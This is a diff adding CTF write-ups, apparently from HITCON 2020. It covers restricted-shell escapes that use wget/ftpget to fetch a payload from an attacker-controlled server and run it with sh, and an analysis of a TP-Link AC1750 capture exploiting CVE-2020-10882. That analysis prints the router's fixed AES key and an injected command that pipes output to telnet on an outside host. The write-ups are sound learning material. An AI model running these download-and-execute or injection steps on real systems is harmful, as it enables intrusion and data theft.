@@ -14,15 +14,99 @@ Index
 
 welcome
 --------
-TODO
+It's a reverse challenge.
+
+`ssh welcome@18.176.232.130
+password: hitconctf`
+
+
+## The challenge
+
+The challenge is literally a reverse challenge. Every word in input is reversed:
+if we run `cat flag`
+we get
+```
+tac: failed to open 'galf' for reading: No such file or directory
+```
+
+# The solution
+If we run `tac galf`
+
+we get `hitcon{!0202 ftcnoctih ot emoclew}`.
+
+Which is the flag.
 
 Revenge of Baby Shock
 --------
-TODO
+`nc 18.178.60.6 1987`
+
+## The challenge
+
+It's identical to baby shock, but more characters are forbidden, including `;` and even a singke`.` 
+
+# The solution
+
+One of the (very few) special characters allowed are `()`. With these, it's possible to declare functions.
+
+This means that we can do
+```bash
+> id () whoami
+> id
+whoami: unknown uid 1129
+```
+
+to redefine one of the allowed commands (in this case `id`) to a function that executes our desired command.
+
+Without the `.`, we couldn't use the same trick as before to execute the reverse shell, as wget by default saves the downloaded files as `index.html` (and to change that name, a flag starting with `-` is required).
+
+Luckily, the server was running busybox, which contains the `ftpget` utility, with the much simper syntax of `ftpget HOST LOCAL_FILE REMOTE_FILE`.
+
+So we run the following commands
+
+```bash
+id () ftpget 123456789 payload payload
+id
+```
+to download via FTP the payload file from our server with ip 123456789 (decimal encoded), which contain the command `/readFlag`
+
+and then
+```
+id () sh payload
+id
+```
+
+To execute it and read the flag, which is `hitcon{r3v3ng3_f0r_semic010n_4nd_th4nks}`
 
 Baby Shock
 --------
-TODO
+`nc 54.248.135.16 1986`
+
+## The challenge
+
+We can connect via netcat to a machine, which contains an extremely limited shell, where the only commands we can run are `pwd ls mkdir netstat sort printf exit help id mount df du find history touch
+` and (most of the) special characters are filtered
+
+# The solution
+
+For some reason, `;` is not filtered. This means that we can run any command by doing
+`id ; mycommand`, as long as mycommand does not contain special characters (such as `-`, so most flags are forbidden)
+
+Also, the `.` is restricted, and cannot appear more than once in a command.
+
+So first we execute
+```bash
+id ; wget 123456789
+```
+where 123456789 is the IP (encoded as decimal number) of a HTTP serve we control, that hosts an index.html containing shell commands
+
+We then execute it via the command
+
+```
+id ; sh index.html
+```
+
+Which allows us to explore the filesystem, and see that there is a `readFlag` binary in `/`.
+By executing it we get the flag `???`
 
 Telescope
 --------
@@ -745,7 +829,160 @@ int main() {
 
 AC1750
 --------
-TODO
+My router is weird, can you help me find the problem?
+
+
+## The challenge
+
+We are given a PCAP file which contains some communication between a computer (a macbook pro) and a router (a TP-link AC1750)
+
+
+# The PCAP
+
+The PCAP can be divided into 3 main flows, one after the other:
+1. Some HTTP requests to the router web interface, which seems to be running some sort of OpenWRT, given the references to the LuCI API. Nothing too interesting here
+2. Some weird UDP traffic from the computer to port 20002 of the router which appears to be encrypted (high entropy, no recognizable strings)
+3. A TCP connection from the router to the computer on port 4321, which sends back the output of the `ls` command
+
+
+
+
+# UDP port 20002
+
+From a quick search on the internet, we find references to [CVE-2020-10882](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-10882), which coincidentally affects the router we are communicating with.
+
+We were able to find [this extremely useful writeup](https://www.thezdi.com/blog/2020/4/6/exploiting-the-tp-link-archer-c7-at-pwn2own-tokyo) which explains the  details of the protocol, and of the vulnerability which causes RCE. TLDR (since it's what we care about): it communicates using packets containing a 32-byte header and a JSON encrypted with AES-128 CBC, with the fixed key `TPONEMESH_Kf!xn?` and IV `1234567890abcdef1234567890abcdef`.
+
+Without knowing anything else about the protocol (except that the injection point is in the slave_mac JSON key), we exported the UDP traffic from wireshark as JSON and wrote this quick python script:
+
+```python
+from Crypto.Cipher import AES
+
+def decrypt(packet_hex):
+	c = AES.new(b'TPONEMESH_Kf!xn?',AES.MODE_CBC,b'1234567890abcdef')
+	enc = bytearray.fromhex(packet_hex[32:])
+	return c.decrypt(enc)
+
+	
+import json
+
+f = json.loads(open("traffic.json").read()) 
+for p in f:
+	try:
+		p = p['_source']['layers']['udp']['udp.payload'].replace(':',"") #because wireshark hexdump is stupid
+		print(json.loads(decrypt(p))['data']['slave_mac'][2:-1])
+	except Exception as e:
+		pass
+```
+
+Which, after a bit of cleaning, this returned
+```bash
+echo>f;
+printf '('>>f;
+printf 'l'>>f;
+printf 's'>>f;
+printf ' '>>f;
+printf '-'>>f;
+printf 'l'>>f;
+printf '&'>>f;
+printf '&'>>f;
+printf 'e'>>f;
+printf 'c'>>f;
+printf 'h'>>f;
+printf 'o'>>f;
+printf ' '>>f;
+printf 'h'>>f;
+printf 'i'>>f;
+printf 't'>>f;
+printf 'c'>>f;
+printf 'o'>>f;
+printf 'n'>>f;
+printf '{'>>f;
+printf 'W'>>f;
+printf 'h'>>f;
+printf 'y'>>f;
+printf '_'>>f;
+printf 'c'>>f;
+printf 'a'>>f;
+printf 'n'>>f;
+printf '_'>>f;
+printf 'o'>>f;
+printf 'n'>>f;
+printf 'e'>>f;
+printf '_'>>f;
+printf 'p'>>f;
+printf 'l'>>f;
+printf 'a'>>f;
+printf 'c'>>f;
+printf 'e'>>f;
+printf '_'>>f;
+printf 'b'>>f;
+printf 'e'>>f;
+printf '_'>>f;
+printf 'i'>>f;
+printf 'n'>>f;
+printf 'j'>>f;
+printf 'e'>>f;
+printf 'c'>>f;
+printf 't'>>f;
+printf 'e'>>f;
+printf 'd'>>f;
+printf '_'>>f;
+printf 't'>>f;
+printf 'w'>>f;
+printf 'i'>>f;
+printf 'c'>>f;
+printf 'e'>>f;
+printf '}'>>f;
+printf '>'>>f;
+printf 'f'>>f;
+printf 'l'>>f;
+printf 'a'>>f;
+printf 'g'>>f;
+printf '&'>>f;
+printf '&'>>f;
+printf 'l'>>f;
+printf 's'>>f;
+printf ' '>>f;
+printf '-'>>f;
+printf 'l'>>f;
+printf ')'>>f;
+printf '|'>>f;
+printf 't'>>f;
+printf 'e'>>f;
+printf 'l'>>f;
+printf 'n'>>f;
+printf 'e'>>f;
+printf 't'>>f;
+printf ' '>>f;
+printf '1'>>f;
+printf '9'>>f;
+printf '2'>>f;
+printf '.'>>f;
+printf '1'>>f;
+printf '6'>>f;
+printf '8'>>f;
+printf '.'>>f;
+printf '0'>>f;
+printf '.'>>f;
+printf '1'>>f;
+printf '0'>>f;
+printf '5'>>f;
+printf ' '>>f;
+printf '4'>>f;
+printf '3'>>f;
+printf '2'>>f;
+printf '1'>>f;
+sh f;
+
+```
+
+Which, when executed, creates the file `f` containining
+```bash
+(ls -l && echo hitcon{Why_can_one_place_be_injected_twice}>flag &&l s -l)|telnet 192.168.0.105 4321
+```
+
+Which contains the flag!
 
 atoms
 --------
